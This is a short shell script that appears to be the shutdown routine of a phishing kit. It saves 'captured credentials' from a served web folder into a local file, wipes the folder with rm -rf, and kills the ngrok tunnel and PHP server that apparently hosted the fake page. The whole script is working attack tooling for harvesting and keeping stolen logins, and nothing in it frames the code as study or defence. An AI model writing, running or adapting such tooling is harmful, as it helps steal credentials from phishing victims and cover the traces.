#!/bin/sh
echo "\n\n"Closing...
echo Saving captured credentials data to safe.txt...
f=www/user.txt
if test -f "$f"
then
	cat $f >> safe.txt
	echo Saved.
else
	echo No new data found.
fi
echo Shutting down server...
rm -rf www/*
killall -q ngrok
killall -q php
echo Done.
